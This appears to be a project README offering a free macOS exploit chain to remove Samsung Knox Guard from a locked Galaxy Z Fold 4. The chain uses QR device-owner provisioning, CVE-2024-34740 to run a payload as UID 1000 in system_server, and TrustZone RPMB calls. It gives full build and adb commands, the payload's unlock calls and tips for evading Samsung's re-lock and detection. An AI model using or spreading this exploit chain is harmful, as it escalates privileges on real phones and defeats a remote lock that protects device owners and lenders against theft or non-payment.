<div align="center">

<br>

# Knox Guard Unlock

**Galaxy Z Fold 4 · SM-F936U1 · Android 13**

A free, Mac-native exploit chain that removes Samsung Knox Guard
using CVE-2024-34740 and TrustZone RPMB manipulation.

<br>

---

`QR Provisioning` · `CVE-2024-34740` · `UID 1000` · `TrustZone RPMB`

---

</div>

<br>

## Overview

Knox Guard is Samsung's enterprise device lock. It survives factory resets because its state is stored in TrustZone hardware. Samsung will not remove it for secondhand buyers. Every commercial tool is Windows-only or sold out.

This project unlocks a KG-locked Galaxy Z Fold 4 entirely from macOS, for free.

<br>

## The Chain

```
 ┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
 │                 │     │                 │     │                 │     │                 │
 │  QR Provision   │────▶│  ABX Overflow   │────▶│  Reflection     │────▶│  TrustZone      │
 │                 │     │                 │     │                 │     │                 │
 │  Device Owner   │     │  CVE-2024-34740 │     │  Call methods   │     │  tz_unlock      │
 │  enables ADB    │     │  drops APK as   │     │  directly on    │     │  Screen(0)      │
 │  via enterprise │     │  UID 1000 in    │     │  KnoxGuardSe    │     │  Locked → Active│
 │  provisioning   │     │  system_server  │     │  Service        │     │  in RPMB        │
 │                 │     │                 │     │                 │     │                 │
 └─────────────────┘     └─────────────────┘     └─────────────────┘     └─────────────────┘
```

<br>

## Status

The unlock fires automatically on every boot via `BOOT_COMPLETED`. The phone is usable.

kgclient may re-lock after a few minutes when it contacts Samsung's servers. Rebooting restores access instantly. The permanent fix (kgclient cache deletion + guardian thread) is documented and ready to deploy.

<br>

## Setup

<details>
<summary>&nbsp;&nbsp;<b>1 &nbsp; Factory reset and provision ADB</b></summary>

<br>

Start the APK server on your Mac, then factory reset the phone.

```bash
python3 -m http.server 8888 --directory ~/Downloads/serve_apk
```

After reset, connect to WiFi during setup. Tap the screen 6 times to open the enterprise QR scanner. Scan `provision_qr.png`. When the USB debugging dialog appears, check **Always allow** and tap Allow.

```bash
adb devices
# RFCW2006DLA    device
```

</details>

<details>
<summary>&nbsp;&nbsp;<b>2 &nbsp; Build and run the exploit</b></summary>

<br>

```bash
cd ~/Downloads/AbxOverflow
export JAVA_HOME=/opt/homebrew/opt/openjdk@17

# Build the payload
./gradlew :droppedapk:assembleRelease
cp droppedapk/build/outputs/apk/release/droppedapk-release.apk \
   app/src/main/assets/

# Build the exploit
./gradlew :app:assembleDebug

# Stage 1 — inject + crash
adb install -r app/build/outputs/apk/debug/app-debug.apk
adb shell am start --activity-clear-task \
    -n com.example.abxoverflow/.MainActivity --ei stage 1
```

Wait for reboot. Then:

```bash
# Stage 2 — patch packages.xml + install payload
adb install -r app/build/outputs/apk/debug/app-debug.apk
adb shell am start --activity-clear-task \
    -n com.example.abxoverflow/.MainActivity --ei stage 2
```

</details>

<details>
<summary>&nbsp;&nbsp;<b>3 &nbsp; Verify</b></summary>

<br>

After the second reboot:

```bash
$ adb shell pm list packages | grep droppedapk
package:com.example.abxoverflow.droppedapk

$ adb shell dumpsys package com.example.abxoverflow.droppedapk | grep userId
    userId=1000
```

Launch the unlock:

```bash
adb shell am start --activity-clear-task \
    -n com.example.abxoverflow.droppedapk/.MainActivity \
    --ei action 36
```

Reboot. The unlock runs automatically.

</details>

<br>

## What the unlock does

On `BOOT_COMPLETED`, the payload executes inside `system_server` as UID 1000:

```
setRemoteLockToLockscreen(false)     clear KG overlay
unlockCompleted()                    mark unlock done
unbindFromLockScreen()               unbind from keyguard
tz_unlockScreen(0)                   RPMB: Locked(3) → Active(2)
tz_resetRPMB(0)                      reset RPMB state
ADB_ENABLED = 1                      re-enable USB debugging
knox.kg.state = "Completed"          set system property
```

<br>

## TA state machine

```
 Prenormal(0) ──▶ Checking(1) ──▶ Active(2) ──▶ Locked(3)
                                      ▲              │
                                      │              │
                                      └──────────────┘
                                     tz_unlockScreen(0)
```

The device starts at **Locked(3)**. We move it to **Active(2)**. kgclient can push it back to Locked if it contacts Samsung's servers — that's the remaining problem.

<br>

## Do not

| | |
|---|---|
| `adb install -r` on droppedapk | Corrupts UID mapping. Bake changes into source before exploit. |
| `pm disable-user` on kgclient | Triggers error 8133 (abnormal detection). |
| `pm clear` on kgclient | Triggers error 3001 (data cleared detection). |
| Update firmware | May patch the exploit. |
| Sign into Samsung account | Gives Samsung a path to re-lock. |

<br>

## Project structure

```
src/
  droppedapk/         payload — runs as UID 1000 in system_server
  exploit/            CVE-2024-34740 stage controller
  device-owner/       QR provisioning APK
apk/                  pre-built binaries
research/             agent research outputs
docs/                 full documentation, handoff, session log
```

<br>

## Remaining work

**kgclient cache deletion** — delete the cached lock command from kgclient's data directory using `File.delete()` from UID 1000. Direct file deletion does not trigger error 3001. This stops kgclient from re-locking.

**Guardian thread** — a persistent background thread in the payload that re-runs the unlock every 30 seconds. Must be baked into the source before running the exploit. Catches any re-lock attempts.

Both are documented in detail in [`docs/FULL_DOCUMENTATION.md`](docs/FULL_DOCUMENTATION.md).

<br>

## Lessons

KG state lives in TrustZone RPMB, not in files or settings. To change it, you must call `KnoxGuardNative` JNI methods from inside `system_server`. The class isn't on the boot classpath — load it via `kgService.getClass().getClassLoader()`. Active(2) is not the same as Completed(4) — kgclient can still receive a server command and transition back to Locked(3). The local unlock works perfectly every time. Samsung server contact is the real enemy.

<br>

---

<div align="center">

Built with [AbxOverflow](https://github.com/michalbednarski/AbxOverflow) by Michal Bednarski

March 2026

</div>
